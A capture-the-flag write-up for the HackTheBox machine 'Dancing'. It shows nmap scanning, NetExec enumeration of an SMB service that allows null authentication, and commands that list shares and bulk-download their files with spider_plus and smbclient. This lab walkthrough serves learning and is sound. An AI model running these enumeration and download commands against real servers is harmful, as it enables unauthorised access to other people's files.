---
tags:
  - Linux
  - SMB
  - Guest access
---

... is a very simple HTB machine which demonstrates an insecure configuration of the server message block (SMB), where null authentications are allowed, enabling anyone to read arbitrary files which are exposed to this service.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2012-05-30T01:29:24
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: 3h59m59s
```
As this is a Windows server, the open port `445` is very interesting. It usually indicates a Server Message Block (SMB) service behind it. SMB is pretty similar to FTP, as both allow users to access (read and-/or write) files which are exposed to this service.

With SMB services, my go-to tool is NetExec (`nxc`, previously CrackMapExec, `cme`). It can be used to interact with different protocols such as `ssh`, `ftp`, or `ldap`. Most importantly, it allows users to quickly enumerate remote SMB services. The following command quickly glances over the SMB service and gives you some information:
```bash
nxc smb $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# smb: specification of the protocol. may be another protocol which is available. see available protocols with nxc -h!
```

The most important piece of information of this short scan is the following:
```bash
(name:DANCING) (domain:Dancing) (signing:False) (SMBv1:None) (Null Auth:True)
```
... it tells us that the service is configured in a way that it accepts connections without valid credentials. This is a old vulnerability which exposed data to attackers.

### Initial Exploitation
Further on, we can now enumerate all shares (similar to directories including files) on the SMB service using `nxc`:
```bash
nxc smb $IP -u 'a' -p '' --shares
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: the username to use. can be anything, as it defaults to the user 'Guest', if the name is not found.
# -p: the password to use. empty here
# --shares: a flag which tells nxc to return a list of available shares.
```

This then shows us the following shares:
```bash
[+] Dancing\a: (Guest)
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
WorkShares      READ,WRITE 
```
There are two shares which we can read, `IPC$` and `WorkShares`. It is now possible to manually connect to the SMB service using the tool `smbclient`, and then interactively list all files and download them.
A more fun (but less stealthy) approach is to use `nxc` to dump all files which can be downloaded onto the users PC. To achieve this, the following command can be used:
```bash
nxc smb $IP -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=.
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: the username to use. can be anything, as it defaults to the user 'Guest', if the name is not found.
# -p: the password to use. empty here
# -M: specify the module which you want to use. you can list modules using 'nxc smb -L'
# -o: pass additional options into the module. the module options can be viewed with 'nxc smb -M spider_plus --options'.
# DOWNLOAD_FLAG: this options sets this flag to true, allowing this module to download all files which it can find. make sure to set this to False first, before downloading too much!
# OUTPUT_FOLDER: specifies where all files will be stored. here, the current directory is used, as it defaults to another place
```

After this command, all available files on all shares can be navigated through with `ls` and `cat`. The flag is found there!

As this approach may be very bad if there are a lot of files on that share, I will still show how to do it with `smbclient`:
```bash
smbclient -U 'a' -N //$IP/WorkShares
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -U: username to use. here, 'a' is used as it defaults to the guest account.
# -N: use no password. is optional, as you can leave the password empty if it asks for it.
```

In the interactive SMB session, you can use these commands to move through the share and fetch the files you desire:
```bash
ftp> ls
ftp> cd
# ls and cd: do the same as usual. listing directory and changing into directory.
ftp> get flag.txt
# get: downloads the specified file onto the local PC.
```
